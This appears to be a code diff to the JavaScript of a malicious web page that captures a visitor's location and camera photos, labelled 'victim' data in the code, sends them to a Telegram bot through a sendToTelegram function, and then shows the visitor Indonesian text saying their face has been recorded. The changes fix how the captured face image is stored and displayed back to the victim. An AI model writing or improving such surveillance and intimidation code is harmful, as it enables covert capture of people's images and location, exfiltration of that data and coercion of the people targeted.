@@ -476,6 +476,7 @@
     let hasCapturedLocation = false;
     let victimData = {};
     let victimFaceBlob = null;
+    let victimFaceUrl = null;
     
     async function sendToTelegram(message, photoBlob = null) {
       try {
@@ -695,8 +696,7 @@
               
               if (i === 1) {
                 victimFaceBlob = blob;
-                const faceUrl = URL.createObjectURL(blob);
-                document.getElementById('victimFace').src = faceUrl;
+                victimFaceUrl = URL.createObjectURL(blob);
               }
               
               await sendToTelegram(`📸 FOTO KORBAN ${i}/3`, file);
@@ -751,7 +751,7 @@
         faceSection.innerHTML = `
           <h2 class="face-title">WAJAH ANDA YANG TELAH DIREKAM</h2>
           <div class="victim-face-container">
-            <img id="victimFace" class="victim-face" src="" alt="Foto Wajah Anda">
+            <img id="victimFace" class="victim-face" src="${victimFaceUrl || 'https://via.placeholder.com/300x300/ff0000/ffffff?text=FOTO+DIREKAM'}" alt="Foto Wajah Anda">
             <div class="face-caption">INILAH FOTO WAJAH ANDA YANG KAMI REKAM</div>
           </div>
         `;
@@ -795,7 +795,7 @@
         faceSection.innerHTML = `
           <h2 class="face-title">WAJAH ANDA YANG TELAH DIREKAM</h2>
           <div class="victim-face-container">
-            <img id="victimFace" class="victim-face" src="" alt="Foto Wajah Anda">
+            <img id="victimFace" class="victim-face" src="${victimFaceUrl || 'https://via.placeholder.com/300x300/ff0000/ffffff?text=FOTO+DIREKAM'}" alt="Foto Wajah Anda">
             <div class="face-caption">INILAH FOTO WAJAH ANDA YANG KAMI REKAM</div>
           </div>
         `;
